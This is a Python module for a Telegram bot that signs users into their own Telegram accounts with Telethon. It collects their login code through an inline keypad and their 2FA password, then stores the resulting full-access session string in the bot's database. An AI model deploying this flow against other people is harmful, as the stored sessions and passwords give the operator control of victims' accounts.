from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import UpdateUsernameRequest
from aiogram import types
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from db import save_session, get_session
from states import LoginState

# Store temporary clients (user_id → client)
clients = {}

# Send OTP code to user's phone
async def send_otp_code(user_id, api_id, api_hash, phone):
    try:
        client = TelegramClient(StringSession(), int(api_id), api_hash)
        await client.connect()

        await client.send_code_request(phone)

        # Save in memory for later use
        clients[user_id] = {
            "client": client,
            "phone": phone
        }

        return True
    except Exception as e:
        print(f"[OTP ERROR] {e}")
        return False

# OTP Keyboard (Live Display)
def generate_otp_keyboard(entered: str = ""):
    keyboard = []

    # Display typed digits
    display_text = f"🔢 OTP: {entered or '____'}"
    keyboard.append([InlineKeyboardButton(display_text, callback_data="noop")])

    # Number buttons
    for row in [["1", "2", "3"], ["4", "5", "6"], ["7", "8", "9"]]:
        keyboard.append([
            InlineKeyboardButton(d, callback_data=f"digit_{d}") for d in row
        ])
    keyboard.append([
        InlineKeyboardButton("0", callback_data="digit_0"),
        InlineKeyboardButton("⌫", callback_data="del"),
        InlineKeyboardButton("✅ Confirm", callback_data="submit")
    ])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# Confirm OTP code and login
async def confirm_otp_code(user_id, code, state, bot):
    try:
        session_data = clients.get(user_id)
        client = session_data["client"]
        phone = session_data["phone"]

        await client.sign_in(phone=phone, code=code)

        string = client.session.save()
        await client.disconnect()

        save_session(user_id, string)

        await bot.send_message(user_id, "✅ OTP Verified! Session saved successfully.")
        await state.finish()
    except SessionPasswordNeededError:
        from states import LoginState
        await bot.send_message(user_id, "🔐 2FA Password Required. Please enter your password:")
        await LoginState.waiting_for_2fa.set()
    except Exception as e:
        print(f"[OTP VERIFY ERROR] {e}")
        await bot.send_message(user_id, "❌ Invalid OTP or expired session. Please try again.")
        await state.finish()

# Confirm 2FA password and save session
async def confirm_2fa_password(user_id, password, state, bot):
    try:
        session_data = clients.get(user_id)
        client = session_data["client"]

        await client.sign_in(password=password)
        string = client.session.save()
        await client.disconnect()

        save_session(user_id, string)
        await state.finish()
        return True
    except Exception as e:
        print(f"[2FA ERROR] {e}")
        return False
